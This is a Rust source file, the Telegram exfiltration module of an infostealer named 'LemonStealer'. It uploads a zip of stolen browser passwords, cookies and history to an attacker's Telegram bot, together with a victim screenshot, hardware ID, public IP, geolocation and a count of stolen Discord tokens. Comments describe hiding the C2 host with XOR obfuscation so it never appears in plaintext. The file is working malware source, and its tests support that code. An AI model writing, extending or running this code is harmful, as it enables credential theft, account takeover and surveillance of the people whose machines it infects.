//! Telegram exfil (wave 7) — sends the dump zip + a machine-info report after
//! a run. Sits above `abi` (all OS/WinAPI lives there); this crate is pure
//! orchestration + string assembly, safe-only.
//!
//! Flow: gather [`abi::MachineInfo`] + screenshot → post the screenshot as a
//! photo with the full info caption (`sendPhoto`) → post the zip
//! (`sendDocument`) with a short caption. If the screenshot fails the report
//! still ships on the document.
//!
//! Configuration is `{ token, chat_id }` — bot token + target chat/user id,
//! supplied by the CLI (or env, see `cli`). Credentials never appear on disk.

use std::path::Path;

use abi::MachineInfo;
use log::{info, warn};

/// Errors surfaced to the CLI (never fatal — a failed exfil must not hide a
/// successful dump).
#[derive(Debug, thiserror::Error)]
pub enum TelegramError {
    #[error("http: {0}")]
    Http(#[from] abi::HttpError),
    #[error("screenshot: {0}")]
    Screenshot(#[from] abi::ScreenshotError),
    #[error("telegram {method} rejected: {detail}")]
    Rejected {
        method: &'static str,
        detail: String,
    },
    #[error("read {path}: {source}")]
    Io {
        path: String,
        source: std::io::Error,
    },
}

/// Bot token + destination chat/user id.
#[derive(Debug, Clone)]
pub struct TelegramConfig {
    pub token: String,
    pub chat_id: String,
}

/// One browser's aggregate counts — the collector section of the caption.
#[derive(Debug, Clone, Default)]
pub struct BrowserStats {
    pub name: String,
    pub entries: usize,
    pub files: usize,
    pub profiles: usize,
    /// Per-category totals for this browser (first-seen order).
    pub categories: Vec<(String, usize)>,
}

/// Totals from the dump writer — the "số lượng" lines in the caption.
#[derive(Debug, Clone, Default)]
pub struct Stats {
    pub entries: usize,
    pub files: usize,
    pub profiles: usize,
    /// Per-category totals, first-seen (Go category) order.
    pub categories: Vec<(String, usize)>,
    /// Per-browser breakdown, first-seen order. `build_caption` renders these
    /// when non-empty and falls back to the flat `categories` line otherwise.
    pub browsers: Vec<BrowserStats>,
    /// Wave 8: Discord tokens stolen (app + web).
    pub discord_tokens: usize,
}

/// Result of one report push.
#[derive(Debug, Default)]
pub struct SendReport {
    pub photo_sent: bool,
    pub document_sent: bool,
}

impl TelegramConfig {
    fn api_url(&self, method: &str) -> String {
        // Host materialized at runtime from an XOR-const blob — the C2 origin
        // never appears plaintext in the image.
        let host = bypass::x!("api.telegram.org", 0x5A);
        format!("https://{host}/bot{}/{method}", self.token)
    }
}

/// Build the full machine-info caption (HTML parse mode + emoji). Pure string
/// math — no network. Telegram renders `parse_mode=HTML`; every free-text
/// value is HTML-escaped before it lands in the string.
pub fn build_caption(info: &MachineInfo, stats: &Stats) -> String {
    let mut s = String::from("🍋 <b>LemonStealer Report</b>\n\n");

    // Device: show the network hostname with the registry "device name" in
    // parens only when they differ (same-name dedup keeps the line clean).
    s.push_str("🖥️ <b>Device:</b> ");
    match (&info.display_name, &info.device_name) {
        (Some(a), Some(b)) if a.trim() != b.trim() => {
            s.push_str(&escape_html(&format!("{a} ({b})")));
        }
        (Some(a), _) => s.push_str(&escape_html(a)),
        (None, Some(b)) => s.push_str(&escape_html(b)),
        (None, None) => s.push_str("N/A"),
    }
    s.push('\n');

    kv_html(&mut s, "👤", "User", value_or_na(&info.user_name));
    kv_html(&mut s, "⚙️", "OS", value_or_na(&info.os_version));
    kv_html(&mut s, "🧠", "CPU", value_or_na(&info.cpu));

    // GPU block: one line per active adapter (iGPU + dGPU).
    s.push_str("🎮 <b>GPU:</b>");
    if info.gpus.is_empty() {
        s.push_str(" N/A");
    }
    for g in &info.gpus {
        s.push_str(&format!("\n   {}", escape_html(g)));
    }
    s.push('\n');

    // RAM.
    s.push_str("🧮 <b>RAM:</b> ");
    match info.ram_total {
        Some(total) => match info.ram_avail {
            Some(avail) => s.push_str(&format!("{} GB total · {} free", gib(total), gib(avail))),
            None => s.push_str(&format!("{} GB", gib(total))),
        },
        None => s.push_str("N/A"),
    }
    s.push('\n');

    // Disk block: one line per fixed logical drive (C:, D:, ...).
    s.push_str("💾 <b>Disk:</b>");
    if info.disks.is_empty() {
        s.push_str(" N/A");
    }
    for d in &info.disks {
        s.push_str(&format!(
            "\n   {}: {} GB total · {} free",
            escape_html(&d.letter),
            gib(d.total),
            gib(d.free)
        ));
    }
    s.push('\n');

    kv_html(&mut s, "🔑", "HWID", value_or_na(&info.hwid));
    kv_html(&mut s, "🌐", "IP", value_or_na(&info.public_ip));

    // Location line is a pre-built Google Maps hyperlink (never a pin). Unlike
    // the escaped plain-text fields, this emits raw markup — callers write it
    // through [`geo_anchor`] so the visible label is already escaped.
    s.push_str("📍 <b>Location:</b> ");
    match &info.location {
        Some(v) if !v.trim().is_empty() => s.push_str(v),
        _ => s.push_str("N/A"),
    }
    s.push('\n');

    s.push_str(&format!(
        "\n📥 <b>Collected:</b> {} entries · {} files · {} profiles\n",
        stats.entries, stats.files, stats.profiles
    ));

    // Collector section: just the browser list, one compact line each — the
    // old per-category breakdown made the caption too long.
    if !stats.browsers.is_empty() {
        s.push('\n');
        for b in &stats.browsers {
            s.push_str(&format!(
                "📊 <b>{}</b> — {} entries · {} profiles\n",
                escape_html(&b.name),
                b.entries,
                b.profiles
            ));
        }
    }
    // Wave 8: Discord tokens stolen (app + web surfaces combined).
    if stats.discord_tokens > 0 {
        s.push_str(&format!(
            "\n🎮 <b>Discord tokens:</b> {}\n",
            stats.discord_tokens
        ));
    }
    truncate_caption(s)
}

/// Escape everything that Telegram's HTML parse mode treats as markup.
fn escape_html(s: &str) -> String {
    s.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
}

/// The Location caption value: a Google Maps hyperlink for the coordinates.
/// The visible label is the human place (HTML-escaped), the href carries the
/// raw coordinates — no live map pin needed.
fn geo_anchor(geo: &abi::GeoInfo) -> String {
    let label = match &geo.place {
        Some(p) if !p.trim().is_empty() => p.clone(),
        _ => format!("{:.4}, {:.4}", geo.lat, geo.lon),
    };
    format!(
        "<a href=\"https://www.google.com/maps?q={lat},{lon}\">{label}</a>",
        label = escape_html(&label),
        lat = geo.lat,
        lon = geo.lon
    )
}

fn value_or_na(v: &Option<String>) -> &str {
    match v {
        Some(s) if !s.trim().is_empty() => s,
        _ => "N/A",
    }
}

/// `emoji <b>label:</b> value` line with an escaped value.
fn kv_html(s: &mut String, emoji: &str, label: &str, value: &str) {
    s.push_str(&format!("{emoji} <b>{label}:</b> {}\n", escape_html(value)));
}

fn gib(bytes: u64) -> String {
    format!("{:.1}", bytes as f64 / (1024.0 * 1024.0 * 1024.0))
}

/// Telegram hard-caps captions at 1024 chars; clip on a line boundary.
fn truncate_caption(mut s: String) -> String {
    if s.len() <= 1024 {
        return s;
    }
    let mut cut = 1020;
    while cut > 0 && !s.is_char_boundary(cut) {
        cut -= 1;
    }
    s.truncate(cut);
    s.push_str("...\n");
    s
}

/// Push one report: screenshot photo with the full caption, then the zip.
pub fn send_report(
    cfg: &TelegramConfig,
    info: &MachineInfo,
    stats: &Stats,
    zip_path: &Path,
) -> Result<SendReport, TelegramError> {
    let mut info = info.clone();
    let mut out = SendReport::default();

    // The archive is the largest payload and it's already on disk — kick the
    // sendDocument upload off on its own thread immediately so the probes,
    // screenshot and photo upload overlap with it instead of queuing behind.
    let zip_cfg = cfg.clone();
    let zip_path_owned = zip_path.to_path_buf();
    let file_name = zip_path
        .file_name()
        .map(|s| s.to_string_lossy().into_owned())
        .unwrap_or_else(|| "results.zip".to_string());
    let doc_caption = format!(
        "🍋 {file_name}\n📥 {} entries · {} files · {} profiles",
        stats.entries, stats.files, stats.profiles
    );
    let doc_file_name = file_name.clone();
    let doc_handle = std::thread::spawn(move || -> Result<(), TelegramError> {
        let zip = std::fs::read(&zip_path_owned).map_err(|source| TelegramError::Io {
            path: zip_path_owned.display().to_string(),
            source,
        })?;
        let body = abi::build_multipart(
            "lemonboundary",
            &[
                ("chat_id", &zip_cfg.chat_id),
                ("caption", &doc_caption),
                ("parse_mode", "HTML"),
            ],
            "document",
            &doc_file_name,
            "application/zip",
            &zip,
        );
        post_checked(&zip_cfg, "sendDocument", &body)
    });

    // Public IP needs a network round-trip — fill it best-effort here so the
    // caption carries it without the caller needing to know about the probe.
    match abi::public_ip() {
        Ok(ip) => info.public_ip = Some(ip),
        Err(e) => warn!("telegram: public ip probe failed ({e})"),
    }
    // Geotag the machine: a Google Maps hyperlink in the caption.
    match abi::geo_info() {
        Ok(geo) => info.location = Some(geo_anchor(&geo)),
        Err(e) => warn!("telegram: geolocation probe failed ({e})"),
    }
    let caption = build_caption(&info, stats);

    // Screenshot first (best-effort — the report still goes out without it).
    match abi::screenshot_png() {
        Ok(png) => {
            let body = abi::build_multipart(
                "lemonboundary",
                &[
                    ("chat_id", &cfg.chat_id),
                    ("caption", &caption),
                    ("parse_mode", "HTML"),
                ],
                "photo",
                "screenshot.png",
                "image/png",
                &png,
            );
            match post_checked(cfg, "sendPhoto", &body) {
                Ok(()) => {
                    out.photo_sent = true;
                    info!("telegram: screenshot sent");
                }
                Err(e) => warn!("telegram: sendPhoto failed: {e}"),
            }
        }
        Err(e) => warn!("telegram: screenshot skipped ({e})"),
    }

    match doc_handle.join() {
        Ok(Ok(())) => {
            out.document_sent = true;
            info!("telegram: {file_name} sent");
        }
        Ok(Err(e)) => return Err(e),
        Err(_) => {
            return Err(TelegramError::Io {
                path: zip_path.display().to_string(),
                source: std::io::Error::other("document upload thread panicked"),
            });
        }
    }
    Ok(out)
}

/// POST a fully-built multipart body and surface telegram's `ok:false` as an
/// error (network + status + JSON `ok` check).
fn post_checked(
    cfg: &TelegramConfig,
    method: &'static str,
    body: &[u8],
) -> Result<(), TelegramError> {
    let (status, resp) = abi::post_multipart(&cfg.api_url(method), "lemonboundary", body)?;
    if status != 200 {
        return Err(TelegramError::Rejected {
            method,
            detail: format!("http {status}: {}", String::from_utf8_lossy(&resp).trim()),
        });
    }
    // Telegram returns {"ok":true,...} on success; surface the error body.
    match serde_json_fragment_ok(&resp) {
        Ok(true) => Ok(()),
        Ok(false) => Err(TelegramError::Rejected {
            method,
            detail: String::from_utf8_lossy(&resp).trim().to_string(),
        }),
        Err(_) => Ok(()), // response wasn't JSON we can read — assume delivered
    }
}

/// Tiny `"ok": true` probe without pulling serde_json into `abi`.
fn serde_json_fragment_ok(resp: &[u8]) -> Result<bool, ()> {
    let s = String::from_utf8_lossy(resp);
    let needle = "\"ok\":";
    let Some(idx) = s.find(needle) else {
        return Err(());
    };
    let rest = &s[idx + needle.len()..];
    let rest = rest.trim_start();
    if rest.starts_with("true") {
        Ok(true)
    } else if rest.starts_with("false") {
        Ok(false)
    } else {
        Err(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn info() -> MachineInfo {
        MachineInfo {
            display_name: Some("DESKTOP-ABC".into()),
            device_name: Some("DESKTOP-ABC".into()),
            user_name: Some("alice".into()),
            os_version: Some("Windows 11 Pro 24H2 (Build 22631.3155)".into()),
            cpu: Some("AMD Ryzen 7 5800X".into()),
            gpus: vec![
                "NVIDIA GeForce RTX 3070".into(),
                "AMD Radeon Graphics".into(),
            ],
            ram_total: Some(32_212_254_720),
            ram_avail: Some(20_123_000_000),
            disks: vec![
                abi::DiskInfo {
                    letter: "C".into(),
                    total: 500_107_862_016,
                    free: 310_123_456_000,
                },
                abi::DiskInfo {
                    letter: "D".into(),
                    total: 1_000_000_000_000,
                    free: 500_000_000_000,
                },
            ],
            hwid: Some("ABCDEFGH-1234-5678-9ABC-DEF012345678-C0DE0001".into()),
            public_ip: Some("203.0.113.7".into()),
            location: Some("Hanoi, Hanoi, Vietnam".into()),
        }
    }

    fn stats() -> Stats {
        Stats {
            entries: 1234,
            files: 12,
            profiles: 3,
            categories: vec![
                ("password".into(), 210),
                ("cookie".into(), 995),
                ("history".into(), 29),
            ],
            browsers: vec![
                BrowserStats {
                    name: "Chrome".into(),
                    entries: 800,
                    files: 8,
                    profiles: 2,
                    categories: vec![
                        ("password".into(), 210),
                        ("history".into(), 90),
                        ("cookie".into(), 500),
                    ],
                },
                BrowserStats {
                    name: "Edge".into(),
                    entries: 434,
                    files: 4,
                    profiles: 1,
                    categories: vec![("password".into(), 100), ("cookie".into(), 334)],
                },
            ],
            discord_tokens: 3,
        }
    }

    #[test]
    fn caption_has_all_fields() {
        let cap = build_caption(&info(), &stats());
        assert!(cap.starts_with("🍋 <b>LemonStealer Report</b>\n"));
        for needle in [
            "🖥️ <b>Device:</b> DESKTOP-ABC",
            "👤 <b>User:</b> alice",
            "⚙️ <b>OS:</b> Windows 11 Pro 24H2 (Build 22631.3155)",
            "🧠 <b>CPU:</b> AMD Ryzen 7 5800X",
            "🎮 <b>GPU:</b>",
            "   NVIDIA GeForce RTX 3070",
            "   AMD Radeon Graphics",
            "🧮 <b>RAM:</b> 30.0 GB total · 18.7 free",
            "💾 <b>Disk:</b>",
            "   C: 465.8 GB total · 288.8 free",
            "   D: 931.3 GB total · 465.7 free",
            "🔑 <b>HWID:</b> ABCDEFGH-1234-5678-9ABC-DEF012345678-C0DE0001",
            "🌐 <b>IP:</b> 203.0.113.7",
            "📍 <b>Location:</b> Hanoi, Hanoi, Vietnam",
            "📥 <b>Collected:</b> 1234 entries · 12 files · 3 profiles",
            "📊 <b>Chrome</b> — 800 entries · 2 profiles",
            "📊 <b>Edge</b> — 434 entries · 1 profiles",
        ] {
            assert!(cap.contains(needle), "missing {needle:?} in:\n{cap}");
        }
    }

    #[test]
    fn caption_omits_collector_section_when_no_browsers() {
        let mut stats = stats();
        stats.browsers.clear();
        let cap = build_caption(&info(), &stats);
        assert!(!cap.contains("📊"));
        assert!(!cap.contains("Totals"));
        assert!(cap.contains("📥 <b>Collected:</b> 1234 entries · 12 files · 3 profiles"));
    }

    #[test]
    fn caption_escapes_markup_and_handles_missing_fields() {
        let mut info = info();
        info.cpu = Some("C<>&".into());
        info.gpus.clear();
        info.disks.clear();
        info.public_ip = None;
        info.location = None;
        let cap = build_caption(&info, &Stats::default());
        assert!(cap.contains("🧠 <b>CPU:</b> C&lt;&gt;&amp;"));
        assert!(cap.contains("🎮 <b>GPU:</b> N/A"));
        assert!(cap.contains("💾 <b>Disk:</b> N/A"));
        assert!(cap.contains("🌐 <b>IP:</b> N/A"));
        assert!(cap.contains("📍 <b>Location:</b> N/A"));
        assert!(cap.contains("🖥️ <b>Device:</b> DESKTOP-ABC"));
        assert!(cap.contains("📥 <b>Collected:</b> 0 entries · 0 files · 0 profiles"));
        assert!(!cap.contains("Totals"));
    }

    #[test]
    fn caption_truncates_at_1024() {
        let mut info = info();
        info.cpu = Some("x".repeat(5000));
        let cap = build_caption(&info, &stats());
        assert!(cap.len() <= 1024, "len {}", cap.len());
        assert!(cap.ends_with("...\n"));
    }

    #[test]
    fn device_line_dedupes_identical_names() {
        // Same display + device name renders once, not twice.
        let cap = build_caption(&info(), &stats());
        assert_eq!(1, cap.matches("Device:").count());
        assert!(cap.contains("🖥️ <b>Device:</b> DESKTOP-ABC"));
    }

    #[test]
    fn escape_html_escapes_markup() {
        assert_eq!("a &amp; b &lt;x&gt; &gt;", escape_html("a & b <x> >"));
    }

    #[test]
    fn geo_anchor_is_a_maps_hyperlink() {
        let geo = abi::GeoInfo {
            lat: 21.0245,
            lon: 105.8412,
            place: Some("Hà Nội, Vietnam".into()),
        };
        let a = geo_anchor(&geo);
        assert_eq!(
            r#"<a href="https://www.google.com/maps?q=21.0245,105.8412">Hà Nội, Vietnam</a>"#,
            a
        );
        // visible label is escaped; coordinates stay raw in the href
        let dirty = abi::GeoInfo {
            lat: 1.5,
            lon: 2.5,
            place: Some("A&B <Co>".into()),
        };
        let a2 = geo_anchor(&dirty);
        assert!(a2.contains(">A&amp;B &lt;Co&gt;</a>"));
        assert!(a2.contains("href=\"https://www.google.com/maps?q=1.5,2.5\""));
        // no place → coordinates double as the label
        let bare = abi::GeoInfo {
            lat: 3.25,
            lon: -4.5,
            place: None,
        };
        assert_eq!(
            r#"<a href="https://www.google.com/maps?q=3.25,-4.5">3.2500, -4.5000</a>"#,
            geo_anchor(&bare)
        );
    }

    /// Live-host preview: print `build_caption` with THIS machine's real info
    /// (plus a best-effort public IP) and save a color-fixed screenshot for
    /// eyeballing. Ignored by default; run with
    /// `cargo test -p telegram -- --ignored --nocapture`. Pure read — no send.
    #[test]
    #[ignore = "live preview (no network send)"]
    fn preview_caption_on_live_host() {
        let mut info = abi::machine_info();
        if let Ok(ip) = abi::public_ip() {
            info.public_ip = Some(ip);
        }
        if let Ok(geo) = abi::geo_info() {
            info.location = Some(geo_anchor(&geo));
            println!(
                "geo: {lat:.4},{lon:.4} ({place})",
                lat = geo.lat,
                lon = geo.lon,
                place = info.location.as_deref().unwrap_or("?")
            )
        } else {
            println!("geo probe: {:?}", abi::geo_info());
        }
        if let Ok(png) = abi::screenshot_png() {
            let path = std::path::Path::new("target").join("screenshot-preview.png");
            if let Some(dir) = path.parent() {
                let _ = std::fs::create_dir_all(dir);
            }
            if std::fs::write(&path, &png).is_ok() {
                println!("screenshot (color-fixed): {}", path.display());
            }
        }
        let stats = Stats {
            entries: 10_001,
            files: 42,
            profiles: 8,
            browsers: vec![BrowserStats {
                name: "Chrome".into(),
                entries: 8_500,
                files: 34,
                profiles: 6,
                categories: vec![
                    ("password".into(), 510),
                    ("history".into(), 6_000),
                    ("cookie".into(), 1_958),
                    ("download".into(), 32),
                ],
            }],
            ..Default::default()
        };
        println!("\n{}", build_caption(&info, &stats));
    }

    #[test]
    fn ok_fragment_probe() {
        assert_eq!(
            Ok(true),
            serde_json_fragment_ok(br#"{"ok":true,"result":[]}"#)
        );
        assert_eq!(
            Ok(false),
            serde_json_fragment_ok(br#"{"ok":false,"error_code":400}"#)
        );
        assert_eq!(Err(()), serde_json_fragment_ok(br#"not json"#));
    }

    #[test]
    fn gib_formatting() {
        assert_eq!("1.0", gib(1024 * 1024 * 1024));
        assert_eq!("30.0", gib(32_212_254_720));
    }
}
